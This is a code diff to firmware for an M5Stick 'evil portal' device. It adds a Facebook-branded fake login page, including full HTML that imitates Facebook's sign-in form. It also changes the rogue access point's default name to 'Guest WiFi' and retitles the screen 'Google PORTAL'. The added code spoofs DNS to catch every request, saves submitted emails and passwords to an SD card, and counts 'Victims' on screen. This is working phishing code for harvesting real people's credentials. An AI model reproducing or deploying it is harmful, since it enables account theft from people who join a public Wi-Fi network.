@@ -1,9 +1,10 @@
+// Facebook Portal was ported from https://github.com/raphntc/Portal-Evil-HUEBR---M5STICK-C-PLUS-/blob/main/portal-evil-huebr/portal-evil-huebr.ino
 // Borrowed from https://github.com/marivaaldo/evil-portal-m5stack/ which
 // has iterative iprovements over my own stand-alone M5Stick Evil Portal.
 // Retaining the Portuguese translations since this project has a large
 // fan base in Brazil. Shouts to CyberJulio as well.
 
-#define DEFAULT_AP_SSID_NAME "Nemo Free WiFi"
+#define DEFAULT_AP_SSID_NAME "Guest WiFi"
 #define SD_CREDS_PATH "/nemo-portal-creds.txt"
 
 #if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR)
@@ -33,6 +34,7 @@
 int totalCapturedCredentials = 0;
 int previousTotalCapturedCredentials = 0;
 String capturedCredentialsHtml = "";
+String capturedCredentialsHtml2 = "";
 
 // Init System Settings
 const byte HTTP_CODE = 200;
@@ -144,7 +146,26 @@ void printHomeToScreen() {
   DISP.setTextSize(MEDIUM_TEXT);
   DISP.setTextColor(TFT_RED, BGCOLOR);
   DISP.setCursor(0, 0);
-  DISP.println("NEMO PORTAL");
+  DISP.println("Google PORTAL");
+  DISP.setTextSize(SMALL_TEXT);
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.printf("%s\n\n",apSsidName.c_str());
+  DISP.print("WiFi IP: ");
+  DISP.println(AP_GATEWAY);
+  DISP.println("Paths: /creds /ssid");
+  DISP.setTextSize(MEDIUM_TEXT);
+  DISP.setTextColor(TFT_RED, BGCOLOR);
+  DISP.printf("Victims: %d\n", totalCapturedCredentials);
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+}
+
+void printHomeToScreen2() {
+  DISP.fillScreen(BLACK);
+  DISP.setSwapBytes(true);
+  DISP.setTextSize(MEDIUM_TEXT);
+  DISP.setTextColor(TFT_RED, BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.println("Facebook PORTAL");
   DISP.setTextSize(SMALL_TEXT);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.printf("%s\n\n",apSsidName.c_str());
@@ -195,8 +216,52 @@ String getHtmlContents(String body) {
   return html;
 }
 
+String getHtmlContents2(String body) {
+  String html =
+    "<!DOCTYPE html><html lang=\"en-US\"><head>"
+    "<meta charset=\"UTF-8\">"
+    "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">"
+    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
+    "<style>"
+    "@charset \"utf-8\";"
+    "* {box-sizing: border-box;text-decoration: none;}"
+    "body {display: flex;flex-direction: row;justify-content: center;align-items: center;margin-top: 40px;font-family: Helvetica, sans-serif;background: #F3F2F2;}"
+    "div#corpo h1 {text-align: center;color: #4169e1;font-size: 50px;}"
+    "div#login {border-radius: 6px;width: 350px;box-shadow: 0 2px 4px rgba(0 ,0 ,0 ,0.3), 0 8px 16px rgba(0 ,0 ,0 ,0.3);}"
+    "div#login form {width: 100px 100px;padding: 16px;background-color: white;border-radius: 8px;}"
+    "div#login a {padding-left: 80px;margin-top: 16px;display: block;}"
+    "div#login p {text-align: center;font-size: 16px;margin-top: 5px;}"
+    "div#login input {width: 100%;margin-bottom: 10px;padding: 16px;border-radius: 6px;border: 1px solid #c3c5c9;}"
+    "div#login input[placeholder] {font-size: 16px;opacity: 50%;}"
+    "div#login button {background-color: #4169e1;border-radius: 8px;border: 1px solid white;width: 100%;padding: 15px;color: white;font-family: Helvetica, sans-serif;font-size: 16px;font-weight: bold;cursor: pointer;}"
+    "</style>"
+    "<link rel=\"shortcut icon\" href=\"favicon.ico\" type=\"image/x-icon\">"
+    "<title>Facebook</title>"
+    "</head>"
+    "<body>"
+    "<div id=\"corpo\">"
+    "<h1>facebook</h1>"
+    "<div id=\"login\">"
+    "<form name=\"login-form\" method=\"POST\" action=\"/post\">"
+    "<p>Sign in to Facebook</p>"
+    "<input type=\"email\" autocomplete=\"email\" name=\"email\" id=\"email\" placeholder=\"Email or phone number\" required>"
+    "<input type=\"password\" name=\"password\" id=\"password\" placeholder=\"Password\" required>"
+    "<button type=\"submit\" name=\"submit\" id=\"submit\">Log In</button>"
+    "<a href=\"#\">Forgot password?</a>"
+    "</form>"
+    "</div>"
+    "</div>"
+    "</body>"
+    "</html>";
+  return html;
+}
+
 String creds_GET() {
   return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
+}
+
+String creds_GET2() {
+  return getHtmlContents2("<ol>" + capturedCredentialsHtml2 + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
 }
 
 String index_GET() {
@@ -210,6 +275,17 @@ String index_GET() {
   return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");
 }
 
+String index_GET2() {
+  String loginTitle = String(LOGIN_TITLE);
+  String loginSubTitle = String(LOGIN_SUBTITLE);
+  String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
+  String loginPasswordPlaceholder = String(LOGIN_PASSWORD_PLACEHOLDER);
+  String loginMessage = String(LOGIN_MESSAGE);
+  String loginButton = String(LOGIN_BUTTON);
+
+  return getHtmlContents2("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");
+}
+
 String index_POST() {
   String email = getInputValue("email");
   String password = getInputValue("password");
@@ -221,8 +297,23 @@ String index_POST() {
   return getHtmlContents(LOGIN_AFTER_MESSAGE);
 }
 
+String index_POST2() {
+  String email = getInputValue("email");
+  String password = getInputValue("password");
+  capturedCredentialsHtml2 = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml2;
+
+#if defined(SDCARD)
+  appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
+#endif
+  return getHtmlContents(LOGIN_AFTER_MESSAGE);
+}
+
 String ssid_GET() {
   return getHtmlContents("<p>Set a new SSID for NEMO Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
+}
+
+String ssid_GET2() {
+  return getHtmlContents2("<p>Set a new SSID for NEMO Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
 }
 
 String ssid_POST() {
@@ -233,12 +324,28 @@ String ssid_POST() {
   return getHtmlContents("NEMO Portal shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
 }
 
+String ssid_POST2() {
+  String ssid = getInputValue("ssid");
+  Serial.println("SSID Has been changed to " + ssid);
+  setSSID(ssid);
+  printHomeToScreen2();
+  return getHtmlContents2("NEMO Portal shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
+}
+
 String clear_GET() {
   String email = "<p></p>";
   String password = "<p></p>";
   capturedCredentialsHtml = "<p></p>";
   totalCapturedCredentials = 0;
   return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
+}
+
+String clear_GET2() {
+  String email = "<p></p>";
+  String password = "<p></p>";
+  capturedCredentialsHtml2 = "<p></p>";
+  totalCapturedCredentials = 0;
+  return getHtmlContents2("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml2</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
 }
 
 #if defined(M5LED)
@@ -255,6 +362,19 @@ void blinkLed() {
 #endif
 
 void shutdownWebServer() {
+  Serial.println("Stopping DNS");
+  dnsServer.stop();
+  Serial.println("Closing Webserver");
+  webServer.close();
+  Serial.println("Stopping Webserver");
+  webServer.stop();
+  Serial.println("Setting WiFi to STA mode");
+  WiFi.mode(WIFI_MODE_STA);
+  Serial.println("Resetting SSID");
+  getSSID();
+}
+
+void shutdownWebServer2() {
   Serial.println("Stopping DNS");
   dnsServer.stop();
   Serial.println("Closing Webserver");
@@ -310,6 +430,54 @@ void setupWebServer() {
   webServer.onNotFound([]() {
     lastActivity = millis();
     webServer.send(HTTP_CODE, "text/html", index_GET());
+  });
+  Serial.println("Starting Webserver");
+  webServer.begin();
+}
+
+void setupWebServer2() {
+  Serial.println("Starting DNS");
+  dnsServer.start(DNS_PORT, "*", AP_GATEWAY);  // DNS spoofing (Only HTTP)
+  Serial.println("Setting up Webserver");
+  webServer.on("/post", []() {
+    totalCapturedCredentials = totalCapturedCredentials + 1;
+    webServer.send(HTTP_CODE, "text/html", index_POST2());
+#if defined(STICK_C_PLUS)
+    SPEAKER.tone(4000);
+    delay(50);
+    SPEAKER.mute();
+#elif defined(CARDPUTER)
+    //SPEAKER.tone(4000, 50);     //Silent mode, just in case
+#endif
+    DISP.print("Login!");
+#if defined(M5LED)
+    blinkLed();
+#endif
+  });
+  
+  Serial.println("Registering /creds");
+  webServer.on("/creds", []() {
+    webServer.send(HTTP_CODE, "text/html", creds_GET2());
+  });
+  Serial.println("Registering /clear");
+  webServer.on("/clear", []() {
+    webServer.send(HTTP_CODE, "text/html", clear_GET2());
+  });
+  Serial.println("Registering /ssid");
+  webServer.on("/ssid", []() {
+    webServer.send(HTTP_CODE, "text/html", ssid_GET2());
+  });
+  Serial.println("Registering /postssid");
+  webServer.on("/postssid", []() {
+    webServer.send(HTTP_CODE, "text/html", ssid_POST2());
+    shutdownWebServer();
+    isSwitching=true;
+    current_proc=19;
+  });
+  Serial.println("Registering /*");
+  webServer.onNotFound([]() {
+    lastActivity = millis();
+    webServer.send(HTTP_CODE, "text/html", index_GET2());
   });
   Serial.println("Starting Webserver");
   webServer.begin();
